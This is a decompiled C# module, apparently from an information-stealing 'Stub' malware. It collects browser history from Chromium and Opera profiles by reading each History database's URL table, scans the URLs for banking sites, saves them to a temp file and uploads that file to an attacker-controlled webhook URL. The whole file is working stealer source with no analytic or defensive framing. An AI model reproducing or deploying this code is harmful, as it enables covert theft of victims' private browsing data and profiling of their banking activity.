using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;

namespace Stub
{
	// Token: 0x0200002B RID: 43
	public static class History
	{
		// Token: 0x0600007C RID: 124 RVA: 0x00006D30 File Offset: 0x00004F30
		public static List<History.Site> GetHistory(string sHistory)
		{
			List<History.Site> result;
			try
			{
				List<History.Site> list = new List<History.Site>();
				Plugin.SQLite sqlite = Plugin.SqlReader.ReadTable(sHistory, "urls");
				if (sqlite == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						History.Site item = default(History.Site);
						item.sTitle = Plugin.Crypto.GetUTF8(sqlite.GetValue(i, 1));
						item.sUrl = Plugin.Crypto.GetUTF8(sqlite.GetValue(i, 2));
						item.iCount = Convert.ToInt32(sqlite.GetValue(i, 3)) + 1;
						Plugin.Banking.ScanData(item.sUrl);
						Plugin.Counter.History++;
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = new List<History.Site>();
			}
			return result;
		}

		// Token: 0x0600007D RID: 125 RVA: 0x00002894 File Offset: 0x00000A94
		public static string FormatHistory(History.Site sSite)
		{
			return string.Format("WEBSITE: {0}\nURL: {1}\n", sSite.sTitle, sSite.sUrl);
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00006DF4 File Offset: 0x00004FF4
		public static string GrabHistory()
		{
			foreach (string text in Program.Paths.sChromiumPswPaths)
			{
				string path;
				if (text.Contains("Opera Software"))
				{
					path = Program.Paths.appdata + text;
				}
				else
				{
					path = Program.Paths.lappdata + text;
				}
				if (Directory.Exists(path))
				{
					foreach (string str in Directory.GetDirectories(path))
					{
						List<History.Site> history = History.GetHistory(str + "\\History");
						if (history.Count > 0)
						{
							foreach (History.Site sSite in history)
							{
								File.AppendAllText(Program.tempFolder + "\\Historicals.txt", History.FormatHistory(sSite) + "\n");
							}
						}
					}
				}
			}
			return History.SendHistory();
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00006EFC File Offset: 0x000050FC
		public static string SendHistory()
		{
			string result;
			try
			{
				result = Functions.CreateDownloadLink(Program.tempFolder + "\\Historicals.txt");
			}
			catch
			{
				History.SendAsFile();
				result = "Sent As File";
			}
			return result;
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00006F40 File Offset: 0x00005140
		public static void SendAsFile()
		{
			using (HttpClient httpClient = new HttpClient())
			{
				MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
				byte[] array = File.ReadAllBytes(Program.tempFolder + "\\Historicals.txt");
				multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), "Document", "History.txt");
				httpClient.PostAsync(Program.WebhookURL, multipartFormDataContent).Wait();
				httpClient.Dispose();
			}
		}

		// Token: 0x0200002C RID: 44
		public struct Site
		{
			// Token: 0x17000004 RID: 4
			// (get) Token: 0x06000081 RID: 129 RVA: 0x000028AE File Offset: 0x00000AAE
			// (set) Token: 0x06000082 RID: 130 RVA: 0x000028B6 File Offset: 0x00000AB6
			public string sUrl { get; set; }

			// Token: 0x17000005 RID: 5
			// (get) Token: 0x06000083 RID: 131 RVA: 0x000028BF File Offset: 0x00000ABF
			// (set) Token: 0x06000084 RID: 132 RVA: 0x000028C7 File Offset: 0x00000AC7
			public string sTitle { get; set; }

			// Token: 0x17000006 RID: 6
			// (get) Token: 0x06000085 RID: 133 RVA: 0x000028D0 File Offset: 0x00000AD0
			// (set) Token: 0x06000086 RID: 134 RVA: 0x000028D8 File Offset: 0x00000AD8
			public int iCount { get; set; }
		}
	}
}
